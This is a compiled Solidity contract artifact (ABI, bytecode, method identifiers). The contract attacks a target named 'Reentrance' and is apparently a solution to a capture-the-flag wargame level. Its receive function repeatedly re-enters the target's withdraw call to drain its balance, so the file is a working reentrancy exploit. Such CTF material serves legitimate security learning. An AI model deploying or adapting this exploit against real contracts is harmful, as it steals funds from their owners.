{"abi":[{"type":"constructor","inputs":[{"name":"_instance","type":"address","internalType":"address payable"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"count","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"donate","inputs":[{"name":"_amount","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"instance","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract Reentrance"}],"stateMutability":"view"}],"bytecode":{"object":"0x608060405234801561001057600080fd5b506040516105123803806105128339818101604052602081101561003357600080fd5b5051600080546001600160a01b039092166001600160a01b03199092169190911790556104ad806100656000396000f3fe6080604052600436106100435760003560e01c8063022ec0951461013f57806306661abd146101705780639e5faafc14610197578063f14faf6f146101ae5761013a565b3661013a5760008054604080516370a0823160e01b815230600482015290516001600160a01b03909216916370a0823191602480820192602092909190829003018186803b15801561009457600080fd5b505afa1580156100a8573d6000803e3d6000fd5b505050506040513d60208110156100be57600080fd5b5051600154909150600311156101375760018054810190556000805460408051632e1a7d4d60e01b81526004810185905290516001600160a01b0390921692632e1a7d4d9260248084019382900301818387803b15801561011e57600080fd5b505af1158015610132573d6000803e3d6000fd5b505050505b50005b600080fd5b34801561014b57600080fd5b506101546101cb565b604080516001600160a01b039092168252519081900360200190f35b34801561017c57600080fd5b506101856101da565b60408051918252519081900360200190f35b3480156101a357600080fd5b506101ac6101e0565b005b6101ac600480360360208110156101c457600080fd5b50356102c1565b6000546001600160a01b031681565b60015481565b60008054604080516370a0823160e01b815230600482015290516001600160a01b03909216916370a0823191602480820192602092909190829003018186803b15801561022c57600080fd5b505afa158015610240573d6000803e3d6000fd5b505050506040513d602081101561025657600080fd5b50516000805460408051632e1a7d4d60e01b81526004810185905290519394506001600160a01b0390911692632e1a7d4d9260248084019391929182900301818387803b1580156102a657600080fd5b505af11580156102ba573d6000803e3d6000fd5b5050505050565b803414610315576040805162461bcd60e51b815260206004820152601760248201527f56616c7565206d757374206d6174636820616d6f756e74000000000000000000604482015290519081900360640190fd5b60008054604080513060248083019190915282518083039091018152604490910182526020810180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167e362a9500000000000000000000000000000000000000000000000000000000178152915181516001600160a01b0390941693869382918083835b602083106103b65780518252601f199092019160209182019101610397565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038185875af1925050503d8060008114610418576040519150601f19603f3d011682016040523d82523d6000602084013e61041d565b606091505b5050905080610473576040805162461bcd60e51b815260206004820152600f60248201527f446f6e6174696f6e206661696c65640000000000000000000000000000000000604482015290519081900360640190fd5b505056fea264697066735822122063cec8e70965b1c76af7cae51351541b7754a4a64bf818be1bdcac0265bd5efd64736f6c634300060c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","count()":"06661abd","donate(uint256)":"f14faf6f","instance()":"022ec095"},"id":1}